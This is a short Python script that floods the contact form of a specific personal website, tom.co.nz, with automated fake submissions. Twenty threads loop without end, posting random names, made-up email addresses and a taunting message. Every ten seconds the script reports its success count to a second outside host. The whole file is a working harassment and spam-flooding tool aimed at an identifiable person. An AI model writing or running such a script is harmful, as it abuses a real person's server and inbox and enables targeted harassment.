import requests
import random
import json
import threading
import signal
import sys
import time

url = 'https://tom.co.nz/form/contact1.php'

names = json.loads(open('names.json').read())

threads = 20

sent = 0
sent2 = 0
failed = 0

def worker():
	global sent
	global sent2
	global failed
	global run_threads
	while 1:
		name = names[random.randrange(0,len(names) - 1)]

		email = name.lower() + str(random.randrange(10,1000)) + '@npctom.com'

		req = requests.post(url, allow_redirects=False, data={

			'InputName': name,
			'InputEmail': email,
			'InputSubject': 'Hi Tom. I want a website',
			'InputMessage': 'sorry tom but i had to. From ' + email
		})

		if req.status_code == 200:
			sent += 1
		else:
			failed += 1

		if req.text == 'Your message successfully submitted. Thank you, I will get back to you soon!':
			sent2 += 1
		# print('name: %s \t and email %s \t req= %s' % (name, email, req.status_code))
		print('req= %s\tsent= %i\tsent2= %i\tfailed= %i\tid= %s' % (req.status_code, sent, sent2, failed, str(threading.current_thread().name)))
		# print(req.text)


for i in range(threads):
    t = threading.Thread(target=worker)
    t.start()

while 1:
	time.sleep(10)
	api = requests.post('https://tom.dcralph.com', allow_redirects=False, data={'count': sent})
	print(api.status_code)
